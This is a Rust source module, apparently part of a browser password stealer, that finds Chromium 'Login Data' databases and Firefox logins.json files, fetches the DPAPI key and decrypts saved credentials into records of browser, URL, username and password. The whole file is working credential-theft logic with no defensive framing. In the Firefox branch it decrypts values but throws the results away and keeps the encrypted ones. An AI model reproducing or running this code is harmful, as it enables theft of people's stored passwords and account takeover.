use std::path::PathBuf;
use serde_json::Value;
use std::fs::{self, File};

use crate::browsers::password::{decrypt_password, decrypt_password_firefox};
use crate::sqdb::{connect_db, list_files};
use crate::dpapi::get_key;
use crate::Log;

pub fn get_browser(browser_path: PathBuf, browser: &str) -> Result<Vec<Log>, String> {
    if fs::metadata(&browser_path).is_ok() {
        let mut results = Vec::new();
        let mut file_data = "";

        if browser != "firefox" {
            file_data = "Login Data"
        } else {
            file_data = "logins.json"
        }

        let mut login_data_files = Vec::new();

        if let Ok(priv_key) = get_key(browser_path.clone()) {
            list_files(browser_path, &mut login_data_files, file_data);

            if browser != "firefox" {
                for login_db in login_data_files {
                    match connect_db(&login_db) {
                        Ok(rows) => {
                            for (url, username, encrypted_password) in rows {
                                if !username.is_empty() {
                                    let password = decrypt_password(&encrypted_password, priv_key);
                                    results.push(Log {
                                        browser: browser.to_string(),
                                        url: url.to_string(),
                                        user: username.to_string(),
                                        password: password.to_string(),
                                    });
                                }
                            }
                        }
                        Err(e) => {
                            println!("[-] {}", format!("{browser} error connecting to db: {}", e));
                        },
                    }
                }
            } else {
                for file in login_data_files {
                    let logs = extract_firefox_logs(file, browser);
                    for row in logs {
                        results.push(Log {
                            browser: row.browser,
                            url: row.url,
                            user: row.user,
                            password: row.password
                        })
                    }
                }
            }

            Ok(results)
        } else {
            Err(format!("[-] {browser} key has not been retrieved"))
        }
    } else {
        Err(format!("[-] {browser} path not found."))
    }
}

pub fn extract_firefox_logs(file_path: String, browser: &str) -> Vec<Log> {
    let mut logs = Vec::new();
    match File::open(file_path) {
        Ok(file) => {
            let json: serde_json::Value = serde_json::from_reader(file).expect("File does not have proper JSON");
            if let Some(logins) = json["logins"].as_array() {
                for log in logins {
                    let url = log.get("formSubmitURL").and_then(Value::as_str).map(|s| s.to_string());
                    let username = log.get("encryptedUsername").and_then(Value::as_str).map(|s| s.to_string());
                    let password = log.get("encryptedPassword").and_then(Value::as_str).map(|s| s.to_string());
                    
                    let _decrypted_username = decrypt_password_firefox(&username);
                    let _decrypted_password = decrypt_password_firefox(&password);

                    logs.push(Log {
                        browser: browser.to_string(),
                        url: url.expect(""),
                        user: username.expect(""),
                        password: password.expect("")
                    })
                }
            }
        }
        Err(e) => {
            eprintln!("{}", e);
        }
    }

    logs
}